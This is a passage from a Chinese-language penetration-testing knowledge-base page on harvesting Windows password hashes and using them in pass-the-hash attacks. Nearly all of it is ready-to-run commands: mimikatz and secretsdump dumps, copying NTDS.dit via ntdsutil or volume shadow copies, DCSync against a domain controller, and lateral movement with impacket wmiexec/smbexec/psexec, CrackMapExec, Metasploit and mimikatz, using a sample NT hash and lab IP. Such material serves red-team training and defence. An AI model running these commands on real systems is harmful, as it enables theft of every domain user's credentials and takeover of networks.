<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">lsadump::sam /sam:SAM /system:SYSTEM</span><br></span></code></pre></div></div>
<p>使用secretsdump提取hash：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">secretsdump.py -sam sam -system system LOCAL</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="域控">域控<a href="#域控" class="hash-link" aria-label="域控的直接链接" title="域控的直接链接">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="mimikatz-1">mimikatz<a href="#mimikatz-1" class="hash-link" aria-label="mimikatz的直接链接" title="mimikatz的直接链接">​</a></h4>
<p>这里和普通PC一样，都是从 lsass.exe 的内存中获取到Hash，不再赘述。</p>
<p>但需要注意的是在域控上，只能拿到本地用户的Hash，即域管的Hash，并不能获取整个域的用户Hash。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="ntdsdit">NTDS.dit<a href="#ntdsdit" class="hash-link" aria-label="NTDS.dit的直接链接" title="NTDS.dit的直接链接">​</a></h4>
<p>由于AD的存储文件为 <code>NTDS.dit</code>，因此通过该文件，我们可以获取所有域用户的Hash。</p>
<p>首先的问题就是如何获取到该文件：</p>
<p><strong>方法一：</strong> 手动导出，在域控上执行如下CMD命令：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">powershell </span><span class="token string" style="color:#e3116c">&quot;ntdsutil.exe &#x27;ac i ntds&#x27; &#x27;ifm&#x27; &#x27;create full c:</span><span class="token string entity" style="color:#36acaa">\t</span><span class="token string" style="color:#e3116c">emp&#x27; q q&quot;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20240416下午22124154" src="/assets/images/image-20240416下午22124154-a5e41b7cde02be6e28a258d7d31d1d0b.png" width="1850" height="902" class="img_ev3q"></p>
<p><strong>方法二：</strong> 利用Windows上的一个卷影拷贝服务的命令行管理工具<code>vssadmin</code>可以将 <code>ntds.dit</code> 从域控中复制出来。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 创建一个C盘的卷影拷贝</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vssadmin create shadow /for</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">C:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 将 ntds.dit 复制到 C:\temp\ntds.dit</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">copy </span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">?</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">GLOBALROOT</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Device</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">HarddiskVolumeShadowCopy2</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">ntds</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">ntds.dit C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">temp</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">ntds.dit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 删除刚才创建的卷影拷贝</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vssadmin delete shadows /for</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">c: /quiet</span><br></span></code></pre></div></div>
<hr>
<p>拿到 <code>ntds.dit</code> 后，我们还需要获取到 <code>SYSTEM</code> 密钥文件</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">reg save HKLM</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">SYSTEM SYSTEM</span><br></span></code></pre></div></div>
<p>最后使用工具通过密钥SYSTEM就需要提取其中的hash。</p>
<p>可使用工具 <a href="https://github.com/zcgonvh/NTDSDumpEx/releases" target="_blank" rel="noopener noreferrer"><strong>NTDSDumpEx</strong></a></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">NTDSDumpEx </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"> ntds.dit </span><span class="token parameter variable" style="color:#36acaa">-s</span><span class="token plain"> system </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> out.txt</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20240416下午23445893" src="/assets/images/image-20240416下午23445893-51624275f1c0f65d7ab93713d89e0972.png" width="1418" height="652" class="img_ev3q"></p>
<p>也可以使用 <a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener noreferrer">impacket</a>下的<strong>secretsdump</strong></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">secretsdump.exe </span><span class="token parameter variable" style="color:#36acaa">-system</span><span class="token plain"> SYSTEM </span><span class="token parameter variable" style="color:#36acaa">-ntds</span><span class="token plain"> ntds.dit </span><span class="token builtin class-name">local</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20240416下午23653207" src="/assets/images/image-20240416下午23653207-516ae5b2c940d8d471880c5cf60d2137.png" width="1598" height="948" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="dcsync">DCSYNC<a href="#dcsync" class="hash-link" aria-label="DCSYNC的直接链接" title="DCSYNC的直接链接">​</a></h4>
<p>DCSync是一种域渗透技术，利用目录复制服务（Directory Replication Service，DRS）的GetNCChanges接口向域控发起数据同步请求，以模仿域控从真实的域控中获取用户散列值。攻击者可以通过DCSync获取域内用户的密码哈希值，需要域管权限或者有DCSYNC权限的用户，一般情况下只有域管。</p>
<p>使用 mimikatz（本地）</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz </span><span class="token string" style="color:#e3116c">&quot;lsadump::dcsync /domain:org.gm7 /all /csv&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;exit&quot;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20240416下午23918267" src="/assets/images/image-20240416下午23918267-d648baacf1165f9cd8d9eba4f1bd0f5c.png" width="1660" height="844" class="img_ev3q"></p>
<p>使用impacket的<code>secretdump.py</code>，结果会保存到 dcsync_hashes 开头的文件中。（远程）</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">secretsdump.py -just-dc </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">user</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">:</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">password</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">@</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">ipaddress</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-outputfile</span><span class="token plain"> dcsync_hashes</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20240422上午105704853" src="/assets/images/image-20240422上午105704853-c8536bd4f7ef1166b96472376377d570.png" width="2090" height="1098" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="hash传递">Hash传递<a href="#hash传递" class="hash-link" aria-label="Hash传递的直接链接" title="Hash传递的直接链接">​</a></h2>
<p>已经拿到hash了，后续的Hash传递交给工具就行了，这里就主要介绍几个常用的命令工具吧，当然有条件用CS更简单。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="impacket套件">impacket套件<a href="#impacket套件" class="hash-link" aria-label="impacket套件的直接链接" title="impacket套件的直接链接">​</a></h3>
<p><a href="https://github.com/fortra/impacket" target="_blank" rel="noopener noreferrer">Impacket</a> is a collection of Python classes for working with network protocols.</p>
<p>WMIEXEC</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># python wmiexec.py -hashes LM Hash:NT Hash 域名/用户名@IP &quot;命令&quot;  # LM Hash不知道的情况下，可以全部用0代替</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 examples/wmiexec.py </span><span class="token parameter variable" style="color:#36acaa">-hashes</span><span class="token plain"> aad3b435b51404eeaad3b435b51404ee:3ac1e294fabedf7d2bfa80fec59f59b9 org/administrator@172.16.93.15 </span><span class="token string" style="color:#e3116c">&quot;whoami&quot;</span><br></span></code></pre></div></div>
<p>SMBEXEC</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># python smbexec.py -hashes LM Hash:NT Hash 域名/用户名@IP</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 examples/smbexec.py </span><span class="token parameter variable" style="color:#36acaa">-hashes</span><span class="token plain"> 00000000000000000000000000000000:3ac1e294fabedf7d2bfa80fec59f59b9 org/administrator@172.16.93.15 </span><span class="token comment" style="color:#999988;font-style:italic"># LM Hash 可以用0代替</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 examples/smbexec.py </span><span class="token parameter variable" style="color:#36acaa">-hashes</span><span class="token plain"> :3ac1e294fabedf7d2bfa80fec59f59b9 org/administrator@172.16.93.15 </span><span class="token comment" style="color:#999988;font-style:italic"># 也可以留空</span><br></span></code></pre></div></div>
<p>PSEXEC</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># python psexec.py -hashes LM Hash:NT Hash 域名/用户名@IP</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 examples/psexec.py </span><span class="token parameter variable" style="color:#36acaa">-hashes</span><span class="token plain"> 00000000000000000000000000000000:3ac1e294fabedf7d2bfa80fec59f59b9 org/administrator@172.16.93.15</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="cme">CME<a href="#cme" class="hash-link" aria-label="CME的直接链接" title="CME的直接链接">​</a></h3>
<p>前面探测服务时用到了<a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener noreferrer">CrackMapExec</a>，它也可以用来Hash传递。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cme smb </span><span class="token number" style="color:#36acaa">172.16</span><span class="token plain">.93.15 </span><span class="token parameter variable" style="color:#36acaa">-u</span><span class="token plain"> administrator </span><span class="token parameter variable" style="color:#36acaa">-H</span><span class="token plain"> 3ac1e294fabedf7d2bfa80fec59f59b9 </span><span class="token parameter variable" style="color:#36acaa">-x</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">whoami</span><br></span></code></pre></div></div>
<p>由于cme不再更新，可以用<a href="https://github.com/Pennyw0rth/NetExec" target="_blank" rel="noopener noreferrer">NetExec</a>或者<a href="https://github.com/The-Viper-One/PsMapExec" target="_blank" rel="noopener noreferrer">PsMapExec</a>平替。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="msf-1">MSF<a href="#msf-1" class="hash-link" aria-label="MSF的直接链接" title="MSF的直接链接">​</a></h3>
<p>可以使用msf提供的各种 <code>exec</code> 模块</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">exploit/windows/smb/psexec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">auxiliary/scanner/smb/impacket/wmiexec</span><br></span></code></pre></div></div>
<p>以<code>psexec</code>为例</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use exploit/windows/smb/psexec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> payload windows/x64/exec </span><span class="token comment" style="color:#999988;font-style:italic"># 可以自己根据选择，我这里演示没用meterpreter</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> CMD calc.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> RHOSTS </span><span class="token number" style="color:#36acaa">172.16</span><span class="token plain">.93.15</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> SMBDomain org.gm7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> SMBPass 00000000000000000000000000000000:3ac1e294fabedf7d2bfa80fec59f59b9</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> SMBUser Administrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="mimikatz-2">mimikatz<a href="#mimikatz-2" class="hash-link" aria-label="mimikatz的直接链接" title="mimikatz的直接链接">​</a></h3>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 没有域的时候，domain写 workgroup 就行</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz.exe </span><span class="token string" style="color:#e3116c">&quot;privilege::debug&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;sekurlsa::pth /user:administrator /domain:org.gm7 /ntlm:3ac1e294fabedf7d2bfa80fec59f59b9&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;exit&quot;</span><br></span></code></pre></div></div>
<p>成功会自动弹出一个新的shell，这时可以任意访问远程主机或服务。</p>
<p><img decoding="async" loading="lazy" alt="image-20240416下午25942600" src="/assets/images/image-20240416下午25942600-571e201a8c17a8ada8d8234c5f379b86.png" width="2226" height="1340" class="img_ev3q"></p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"></div><div class="col lastUpdated_JAkA"><span class="theme-last-updated">最后<!-- -->由 <b>d4m1ts</b> <!-- -->于 <b><time datetime="2025-06-14T04:13:25.000Z" itemprop="dateModified">2025年6月14日</time></b> <!-- -->更新</span></div></div></footer></article><nav class="pagination-nav" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/渗透测试/内网渗透/横向移动/横向移动"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">横向移动</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/渗透测试/内网渗透/横向移动/NTLM_Relay"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">NTLM_Relay</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#简介" class="table-of-contents__link toc-highlight">简介</a></li><li><a href="#如何拿到hash" class="table-of-contents__link toc-highlight">如何拿到Hash</a><ul><li><a href="#普通pc" class="table-of-contents__link toc-highlight">普通PC</a><ul><li><a href="#mimikatz" class="table-of-contents__link toc-highlight">mimikatz</a></li><li><a href="#msf" class="table-of-contents__link toc-highlight">MSF</a></li><li><a href="#nishang" class="table-of-contents__link toc-highlight">Nishang</a></li><li><a href="#手动从sam获取" class="table-of-contents__link toc-highlight">手动从SAM获取</a></li></ul></li><li><a href="#域控" class="table-of-contents__link toc-highlight">域控</a><ul><li><a href="#mimikatz-1" class="table-of-contents__link toc-highlight">mimikatz</a></li><li><a href="#ntdsdit" class="table-of-contents__link toc-highlight">NTDS.dit</a></li><li><a href="#dcsync" class="table-of-contents__link toc-highlight">DCSYNC</a></li></ul></li></ul></li><li><a href="#hash传递" class="table-of-contents__link toc-highlight">Hash传递</a><ul><li><a href="#impacket套件" class="table-of-contents__link toc-highlight">impacket套件</a></li><li><a href="#cme" class="table-of-contents__link toc-highlight">CME</a></li><li><a href="#msf-1" class="table-of-contents__link toc-highlight">MSF</a></li><li><a href="#mimikatz-2" class="table-of-contents__link toc-highlight">mimikatz</a></li></ul></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">内容导航</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/friends">友情链接</a></li><li class="footer__item"><a class="footer__link-item" href="/promotions">我的推广</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">实用工具</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://markdown.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">在线Markdown<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://rshell.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Reverse Shell Generator<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://gtfobins.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">GTFOBins<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">关注我</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="mailto:admin@gm7.org" target="_blank" rel="noopener noreferrer" class="footer__link-item">联系我<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 d4m1ts 知识库</div></div></div></footer></div>
</body>
</html>